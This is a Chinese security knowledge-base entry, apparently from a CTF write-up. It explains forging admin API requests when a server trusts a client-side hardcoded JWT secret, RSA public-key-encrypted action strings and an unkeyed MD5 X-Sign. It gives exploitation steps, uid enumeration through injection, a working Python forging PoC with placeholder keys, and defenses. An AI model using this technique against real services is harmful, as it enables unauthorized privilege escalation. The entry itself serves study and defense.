---
id: web-generic-auth-client-recomputable-signature-forge
title: 服务端信任客户端可离线复算的请求签名与硬编码 JWT，可伪造管理员特权 API 请求
type: scenario
domain: web
path: web/generic/auth
technique: client-recomputable-signature-privilege-forge
tags:
- api-security
- signature-forge
- md5
- rsa
- jwt
- client-trust
- privilege-escalation
- replay
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-10
  verified_at: '2026-11-08T01:09:16+08:00'
  notes: 已对照原文核对；图 19/20/21 的硬编码 JWT+RSA 公钥加密 action+MD5(body) 作 X-Sign+uid 注入枚举 admin 与卡一致，最终 getflag 拿到 flag、危害已打通，非半链；dedup_review 成立；未验证点：服务端校验逻辑由客户端行为推断(confidence=medium)，未见服务端源码
url: /docs/web/generic/auth/web-generic-auth-client-recomputable-signature-forge/
draft: false
kb_aliases:
- 客户端签名可复算伪造
- X-Sign MD5 伪造
- 硬编码 JWT + 公钥加密动作
- 特权 API 请求伪造
---

## 一句话结论

敏感接口要求 JWT、请求体 MD5 签名（如 `X-Sign`）与 RSA 公钥加密的动作串，但这三样都能从客户端逆推（JWT 密钥硬编码、公钥与动作明文内置、MD5 是无密钥摘要）；服务端若没有独立的、不可由客户端复算的信任根，攻击者可完全离线拼装一个合法的管理员请求。

## 原理

- 接口形如 `POST /api/v1/getflag`，要求：`Authorization: <JWT>`、`X-Sign: md5(request_body)`、以及 body 中用 RSA 公钥 PKCS1_v1_5 加密的 `{"action":"getflag"}`。
- 为什么三样都不是认证：JWT 签名密钥硬编码在客户端 → 可签发任意 `uid`；RSA 是**公钥加密**，只提供机密性，任何拿到公钥的人都能加密，不构成请求方身份证明；`md5(body)` 是无密钥摘要，任何人都能对任意 body 复算。三者都只是「形式正确」，不是「只有合法客户端能产生」。
- 为什么成立：服务端把「客户端能算出来的东西」当作鉴权依据，缺少服务端独有秘密（服务端会话、HMAC 密钥）、时间戳/nonce 防重放、以及独立的权限查询。因此「能构造出格式合法的请求」等价于「被授权」。
- 权限提升点：`uid` 由客户端 token 提供，管理员 uid 可通过接口注入/枚举获得；拿到后填进伪造 JWT 即被当作管理员。
- 置信度 medium：服务端具体校验逻辑由客户端行为与返回推断，未直接看到服务端源码，但「格式全合法即返回目标数据」已被证实。

## 触发条件

- 客户端可反编译得到 JWT 签名密钥、RSA 公钥、动作串与签名算法（见 HAP/ABC 逆向提取硬编码密钥）；
- 请求签名/摘要不含服务端独有秘密（如 MD5(body) 而非 HMAC），或 HMAC 密钥同样内置；
- 权限由客户端 token 的 `uid`/角色字段判定，服务端不二次核对；
- 接口无时间戳、nonce、重放检测，动作串未做服务端白名单。

## 利用步骤

1. 逆向客户端，取得硬编码 JWT 密钥、RSA 公钥、动作串与目标端点。
2. 用接口参数注入/枚举拿到管理员 `uid`（本例 `contacts?uid=` 处注入返回用户列表，含 admin 的 uuid）。
3. 伪造 `uid=<admin>` 的管理员 JWT。
4. 用公钥把 `{"action":"getflag"}` 加密为密文，拼成请求体 `{"data":"<cipher>"}`。
5. 对请求体取 MD5 作为 `X-Sign`，带上管理员 JWT 发送，读取响应中的目标数据。

## PoC

```python
# 仅在授权环境验证；密钥/公钥均来自客户端逆向
import jwt, base64, hashlib, requests
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5

JWT_SECRET = "<HARDCODED_JWT_SECRET>"
ADMIN_UID  = "<ENUMERATED_ADMIN_UID>"
PUBKEY     = """<RSA_PUBLIC_KEY>"""

admin_jwt = jwt.encode({"sub": "0", "uid": ADMIN_UID, "iat": 0},
                       JWT_SECRET, algorithm="HS256")
cipher = PKCS1_v1_5.new(RSA.import_key(PUBKEY))
data = base64.b64encode(cipher.encrypt(b'{"action":"getflag"}')).decode()
body = '{"data":"' + data + '"}'
headers = {"Authorization": admin_jwt,
           "X-Sign": hashlib.md5(body.encode()).hexdigest(),
           "Content-Type": "application/json"}
r = requests.post("<BASE_URL>/api/v1/getflag", data=body, headers=headers)
print(r.text)
```

## 变体与关联

- 变体：签名改用 HMAC 但密钥仍内置客户端；签名不含时间戳/nonce → 请求可重放；JWT 允许 `alg=none`/弱密钥；公钥加密换成对称加密但 key 同样内置；动作串改为服务端未白名单的其它特权操作。
- 关联：HAP/ABC 逆向提取硬编码密钥、JWT 硬编码密钥伪造、SQL 注入枚举 uid、服务端密钥签名 oracle / 可复现重放。

## 检测与防御

- 防御：请求签名必须是服务端独有密钥的 HMAC-SHA256，密钥绝不下发；请求带时间戳 + 一次性 nonce 并做重放检测；权限由服务端会话/数据库按登录态判定，不信任客户端 token 里的 uid/角色声明；敏感动作用服务端白名单 + 二次鉴权；RSA 只用于机密性，认证改用私钥签名或证书绑定。
- 加固：客户端混淆/加固不能替代服务端鉴权；把客户端能算出的所有值视为公开数据。
- 检测：同一签名/nonce 重复出现、JWT `iat` 异常或固定、来自非官方客户端却携带合法格式签名、管理员 `uid` 被非管理会话调用。
